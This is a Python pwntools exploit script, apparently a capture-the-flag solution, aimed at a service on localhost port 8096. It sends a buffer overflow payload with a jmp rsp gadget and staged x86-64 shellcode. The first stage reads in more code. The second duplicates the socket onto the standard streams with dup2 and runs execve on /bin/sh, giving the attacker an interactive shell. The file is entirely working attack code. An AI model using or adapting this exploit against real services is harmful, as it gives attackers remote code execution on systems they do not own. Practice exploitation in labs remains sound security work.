#!/usr/bin/env python3

from pwn import *
from pwnlib.util.packing import p64, u64

context.arch = 'amd64'

def main():
    p = remote('127.0.0.1', 8096)
    
    jmp_rsp = 0x40185d

    stage1_shellcode = '''
        mov rdi, rax
        mov al, 32
        syscall
        dec eax

        xchg rdi, rax
        mov dl, 100
        syscall
    '''

    stage2_shellcode = '''
    loop:
        mov rsi, rbx
        xor rax, rax
        mov al, 33
        syscall
        inc rbx
        cmp bl, 3
        jne loop
        
        xor rax, rax
        mov rsi, rax
        lea rdi, [rsp - 48]
        mov rdx, rax
        mov al, 59
        syscall
    '''

    stage1_shellcode = asm(stage1_shellcode)
    stage2_shellcode = asm(stage2_shellcode)

    stage1 = 'done'
    stage1 += '/bin/sh\x00'
    stage1 = stage1.encode('utf-8')
    stage1 += b'\x90'*(28-len(stage1_shellcode))
    stage1 += stage1_shellcode
    stage1 += p64(jmp_rsp) + b'\xeb\xe2'

    stage2 = '/bin/sh\x00'
    stage2 = stage2.encode('utf-8')
    stage2 += b'\x90'*40
    stage2 += stage2_shellcode

    p.sendline(stage1)
    p.interactive()
    p.sendline(stage2)

    p.interactive()


if __name__ == '__main__':
    main()